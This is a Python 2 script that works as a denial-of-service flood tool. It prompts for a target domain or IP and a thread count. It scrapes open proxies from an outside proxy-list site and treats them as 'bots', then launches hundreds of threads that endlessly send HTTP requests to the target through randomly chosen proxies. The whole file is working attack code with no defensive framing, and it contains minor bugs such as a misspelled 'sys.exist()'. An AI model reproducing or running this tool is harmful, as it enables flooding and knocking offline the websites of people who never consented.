import socket,urllib2,threading,random,time,re
try:
 import requests
except:
 print"You need to install: requests"
 sys.exist()
try:
 import bs4
 from bs4 import BeautifulSoup
except:
 print"You need to install: bs4"
 sys.exit()
l="http://www. proxyserver list24 .top/"
l=l.replace(" ","")
global pr
pr=[]
li=[]
m=[]
global v
v=0
n=0
while n<1:
 try:
  url=raw_input('\n\n\nTARGET:\n( www.example.com or IP )\n>')
  socket.gethostbyname(url)
  if url!="":
   n+=1
  else:
   print"Don't leave your target blank"
 except:
  print"Write your the domain or IP correctly"
while n<2:
 try:
  th=input("\n\nThreads:(500<threads<1000)\n>")
  if ((th<5001) and (th>499)):
   n+=1
  else:
   print"For better results limit your threads to that range"
 except:
  print"Enter a number between 700 and 1000"
print"[+]Fetching resources..."
try:
 r=requests.get(l,{'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)'}).text
 soup= BeautifulSoup ( r, 'html.parser')
 h3tags = soup.findAll('a')
 for a in h3tags:
    try:
     if (a.has_attr('href') and (l in str(a)) and ("proxy-server" in str(a)) and("#" not in (str(a)))) :
      try:
       a=str(a)
       a=a.split('href="')[1]
       a=a.split('"')[0]
       if (a not in m):
          m.append(a)
      except Exception as xx:
       pass
    except Exception as ex:
     continue
except Exception as e:
  pass
print"[*]Gathering bots:"
for k in m:
 try:
  print"[+]Page",m.index(k)+1
  a=requests.get(k, {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)'})
  ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})",a.text)
  for w in ips:
    pr.append(w)
 except Exception as e:
  pass
print"\nBots:",len(pr),"\n"
time.sleep(5.000)
class phu(threading.Thread):
 def run(self):
  c=v
  while True:
   p=random.choice(pr)
   try:
    proxy = urllib2.ProxyHandler({ 'http': p, 'https': p })
    opener = urllib2.build_opener(proxy) 
    urllib2.install_opener(opener)
    urllib2.urlopen("http://"+url+"/")
    print"\033[1;91m[!] \033[1;91mBot \033[1;94m#{} | \033[1;94mS0u1Server\033[1;93m@\033[1;91mBot\033[1;94m~:\033[1;94m{} | \033[1;92m[CONNECTED] |".format(c,p)
   except Exception as e:
    try:
     pr.remove(p)
    except:
     pass
for x in range(1,th+1):
 t=phu()
 t.start()
 v=x
 print"\033[1;95m[+]Starting | thread #{}".format(v)
 time.sleep(.0001)